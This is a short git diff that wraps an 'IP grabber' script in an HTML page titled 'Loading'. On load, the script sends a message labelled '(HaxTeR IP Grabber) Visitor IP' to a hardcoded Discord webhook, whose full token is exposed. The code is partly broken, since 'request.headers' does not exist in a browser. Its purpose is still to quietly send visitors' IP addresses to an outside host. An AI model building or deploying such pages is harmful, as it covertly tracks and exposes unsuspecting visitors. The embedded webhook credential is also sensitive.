@@ -1,15 +1,25 @@
-async function sendToWebhook(webhookURL, message) {
-  const response = await fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ content: message }),
-  });
-}
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading</title>
+</head>
+<body>
+  <script>
+    async function sendToWebhook(webhookURL, message) {
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content: message }),
+      });
+    }
 
-const webhookURL = 'YOUR_WEBHOOK_URL';
+    const webhookURL = 'https://discord.com/api/webhooks/1041188966768070726/lIhCjkv3BbpdKgVB2UpRqkZ2NDtMPZ_ssKmWjtFFUzAAVz5ekCpW1aRNjtE09-a315nv';
 
-const message = `Visitor IP (ignore ip in pins) (HaxTeR): ${request.headers['X-Forwarded-For']}`;
+    const message = `(HaxTeR IP Grabber) Visitor IP: ${request.headers['X-Forwarded-For']}`;
 
-sendToWebhook(https://discord.com/api/webhooks/1041188966768070726/lIhCjkv3BbpdKgVB2UpRqkZ2NDtMPZ_ssKmWjtFFUzAAVz5ekCpW1aRNjtE09-a315nv, message);
+    sendToWebhook(webhookURL, message);
+  </script>
+</body>
+</html>
